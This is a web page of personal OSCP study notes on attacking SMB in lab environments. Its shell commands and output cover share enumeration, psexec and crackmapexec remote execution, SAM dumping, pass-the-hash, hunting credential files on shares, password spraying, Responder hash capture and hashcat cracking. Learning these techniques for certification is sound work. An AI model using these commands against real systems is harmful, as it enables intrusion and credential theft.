<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content='net use Z: \\10.0.0.122\print$ /user:anonymous ""
PS C:\Users\shaik> copy z:\x64 .
PS C:\Users\shaik> ls
sudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.'><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="smb :: DrakonOps"><meta name=twitter:description content='net use Z: \\10.0.0.122\print$ /user:anonymous ""
PS C:\Users\shaik> copy z:\x64 .
PS C:\Users\shaik> ls
sudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.'><meta property="og:url" content="https://web/oscp-notes/smb/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="smb :: DrakonOps"><meta property="og:description" content='net use Z: \\10.0.0.122\print$ /user:anonymous ""
PS C:\Users\shaik> copy z:\x64 .
PS C:\Users\shaik> ls
sudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="smb :: DrakonOps"><meta itemprop=description content='net use Z: \\10.0.0.122\print$ /user:anonymous ""
PS C:\Users\shaik> copy z:\x64 .
PS C:\Users\shaik> ls
sudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.'><meta itemprop=wordCount content="1592"><title>smb :: DrakonOps</title>
<link href=../../images/logo.png?1762046208 rel=icon type=image/png><link href=../../css/auto-complete/auto-complete.min.css?1762046208 rel=stylesheet><script src=../../js/auto-complete/auto-complete.min.js?1762046208 defer></script><script src=../../js/search-lunr.min.js?1762046208 defer></script><script src=../../js/search.min.js?1762046208 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762046208"</script><script src=../../js/lunr/lunr.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.stemmer.support.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.multi.min.js?1762046208 defer></script><script src=../../js/lunr/lunr.en.min.js?1762046208 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762046208 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762046208 rel=stylesheet></noscript><link href=../../css/perfect-scrollbar/perfect-scrollbar.min.css?1762046208 rel=stylesheet><link href=../../css/theme.min.css?1762046208 rel=stylesheet><link href=../../css/format-html.min.css?1762046208 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/smb/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://web",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../css/custom.css?1762046208 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/smb/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#smbmap>SMBMap</a><ul><li></li></ul></li><li><a href=#rpcclient>rpcclient</a><ul><li></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>smb</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/dns/index.html title="dns (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/nfs/index.html title="nfs (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=smb>smb</h1><p>net use Z: \\10.0.0.122\print$ /user:anonymous ""</p><p>PS C:\Users\shaik> copy z:\x64 .<br>PS C:\Users\shaik> ls</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>sudo nmap 10.129.14.128 -sV -sC -p139,445
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>smbclient -N -L //10.129.14.128
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>smbclient //10.129.14.128/notes
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>smbmap -H 10.129.14.128
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download &#34;notes\note.txt&#34;
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &#34;notes\test.txt&#34;
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>RCE smb</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=windows-cmd---dir>Windows CMD - DIR</h4><p>Interacting with Common Services</p><p>mount shares</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>C:\htb&gt; net use n: \\192.168.220.129\Finance /user:plaintext Password123

The command completed successfully.</code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\htb&gt; dir n: /a-d /s /b | find /c &#34;:\&#34;

29302</code></pre></div><p>Â </p><p>Â </p><ul><li>cred</li><li>password</li><li>users</li><li>secrets</li><li>key</li><li>Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.</li></ul><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\htb&gt;dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\htb&gt;dir n:\*secret* /s /b

n:\Contracts\private\secret.txt</code></pre></div><p>Â </p><p>Â </p><p>If we want to search for a specific word within a text file, we can use <a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr rel=external>findstr</a>.</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>findstr /s /i cred n:\*.*</code></pre></div><p>Â </p><p><a href=#R-image-f2bea01fa87ed77959d21ffbd049c8ba class=lightbox-link><img alt=3f096382078d42a24a4fceda20762e00.png class="lazy lightbox figure-image" loading=lazy src=../../resources/3f096382078d42a24a4fceda20762e00.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f2bea01fa87ed77959d21ffbd049c8ba><img alt=3f096382078d42a24a4fceda20762e00.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/3f096382078d42a24a4fceda20762e00.png></a></p><p>Â </p><p>Â </p><p>Â </p><p>POWERSHELL</p><p>Â </p><h4 id=windows-powershell>Windows PowerShell</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; Get-ChildItem \\192.168.220.129\Finance\</code></pre></div><p>Â </p><p>Â </p><p>Instead of <code>net use</code>, we can use <code>New-PSDrive</code> in PowerShell.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; New-PSDrive -Name &#34;N&#34; -Root &#34;\\192.168.220.129\Finance&#34; -PSProvider &#34;FileSystem&#34;</code></pre></div><p>Â </p><p>Â </p><h4 id=windows-powershell---pscredential-object>Windows PowerShell - PSCredential Object</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; $username = &#39;plaintext&#39;
PS C:\htb&gt; $password = &#39;Password123&#39;
PS C:\htb&gt; $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb&gt; $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb&gt; New-PSDrive -Name &#34;N&#34; -Root &#34;\\192.168.220.129\Finance&#34; -PSProvider &#34;FileSystem&#34; -Credential $cred</code></pre></div><p>Â </p><h4 id=windows-powershell---gci>Windows PowerShell - GCI</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; N:
PS N:\&gt; (Get-ChildItem -File -Recurse | Measure-Object).Count

29302</code></pre></div><p>Â </p><p>Listing files which has cred in the file name</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; Get-ChildItem -Recurse -Path N:\ -Include *cred* -File</code></pre></div><p>Â </p><p>Â </p><h4 id=windows-powershell---select-string>Windows PowerShell - Select-String</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\htb&gt; Get-ChildItem -Recurse -Path N:\ | Select-String &#34;cred&#34; -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=linux---mount>Linux - Mount</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ sudo mkdir /mnt/Finance
</span></span><span style=display:flex><span>[!bash!]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=credentialfile>CredentialFile</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>username=plaintext
</span></span><span style=display:flex><span>password=Password123
</span></span><span style=display:flex><span>domain=.</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=linux---find>Linux - Find</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ find /mnt/Finance/ -name *cred*
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/mnt/Finance/Contracts/private/credentials.txt
</span></span></code></pre></div><p>Next, let's find files that contain the string <code>cred</code>:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ grep -rn /mnt/Finance/ -ie cred
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
</span></span><span style=display:flex><span>/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Password spray and bruteforce</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-auth
</span></span></code></pre></div><p>Â </p><p><strong>Note:</strong> By default CME will exit after a successful login is found. Using the <code>--continue-on-success</code> flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option <code>--local-auth</code>. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.</p><p>Â </p><p>Â </p><p>Â Responder</p><p>Suppose a user mistyped a shared folder's name <code>\\mysharefoder\</code> instead of <code>\\mysharedfolder\</code>. In that case, all name</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ sudo responder -I ens33
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                                         __               
</span></span><span style=display:flex><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
</span></span><span style=display:flex><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
</span></span><span style=display:flex><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
</span></span><span style=display:flex><span>                   |__|              
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
</span></span><span style=display:flex><span>               
</span></span><span style=display:flex><span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
</span></span><span style=display:flex><span>  To kill this script hit CTRL-C
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Poisoners:                
</span></span><span style=display:flex><span>    LLMNR                      [ON]
</span></span><span style=display:flex><span>    NBT-NS                     [ON]        
</span></span><span style=display:flex><span>    DNS/MDNS                   [ON]   
</span></span><span style=display:flex><span>                                                                                                                                                                                          
</span></span><span style=display:flex><span>[+] Servers:         
</span></span><span style=display:flex><span>    HTTP server                [ON]                                   
</span></span><span style=display:flex><span>    HTTPS server               [ON]
</span></span><span style=display:flex><span>    WPAD proxy                 [OFF]                                  
</span></span><span style=display:flex><span>    Auth proxy                 [OFF]
</span></span><span style=display:flex><span>    SMB server                 [ON]                                   
</span></span><span style=display:flex><span>    Kerberos server            [ON]                                   
</span></span><span style=display:flex><span>    SQL server                 [ON]                                   
</span></span><span style=display:flex><span>    FTP server                 [ON]                                   
</span></span><span style=display:flex><span>    IMAP server                [ON]                                   
</span></span><span style=display:flex><span>    POP3 server                [ON]                                   
</span></span><span style=display:flex><span>    SMTP server                [ON]                                   
</span></span><span style=display:flex><span>    DNS server                 [ON]                                   
</span></span><span style=display:flex><span>    LDAP server                [ON]
</span></span><span style=display:flex><span>    RDP server                 [ON]
</span></span><span style=display:flex><span>    DCE-RPC server             [ON]
</span></span><span style=display:flex><span>    WinRM server               [ON]                                   
</span></span><span style=display:flex><span>                                                                                   
</span></span><span style=display:flex><span>[+] HTTP Options:                                                                  
</span></span><span style=display:flex><span>    Always serving EXE         [OFF]                                               
</span></span><span style=display:flex><span>    Serving EXE                [OFF]                                               
</span></span><span style=display:flex><span>    Serving HTML               [OFF]                                               
</span></span><span style=display:flex><span>    Upstream Proxy             [OFF]                                               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Poisoning Options:                                                             
</span></span><span style=display:flex><span>    Analyze Mode               [OFF]                                               
</span></span><span style=display:flex><span>    Force WPAD auth            [OFF]                                               
</span></span><span style=display:flex><span>    Force Basic Auth           [OFF]                                               
</span></span><span style=display:flex><span>    Force LM downgrade         [OFF]                                               
</span></span><span style=display:flex><span>    Fingerprint hosts          [OFF]                                               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Generic Options:                                                               
</span></span><span style=display:flex><span>    Responder NIC              [tun0]                                              
</span></span><span style=display:flex><span>    Responder IP               [10.10.14.198]                                      
</span></span><span style=display:flex><span>    Challenge set              [random]                                            
</span></span><span style=display:flex><span>    Don\&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Current Session Variables:                                                     
</span></span><span style=display:flex><span>    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
</span></span><span style=display:flex><span>    Responder Domain Name      [HF2L.LOCAL]                                        
</span></span><span style=display:flex><span>    Responder DCE-RPC Port     [48162] 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Listening for events... 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
</span></span><span style=display:flex><span>[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
</span></span><span style=display:flex><span>[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
</span></span><span style=display:flex><span>[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
</span></span><span style=display:flex><span>[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
</span></span><span style=display:flex><span>[SMB] NTLMv2-SSP Client   : 10.10.110.17
</span></span><span style=display:flex><span>[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
</span></span><span style=display:flex><span>[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
</span></span></code></pre></div><p>Â </p><p>Â </p><p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
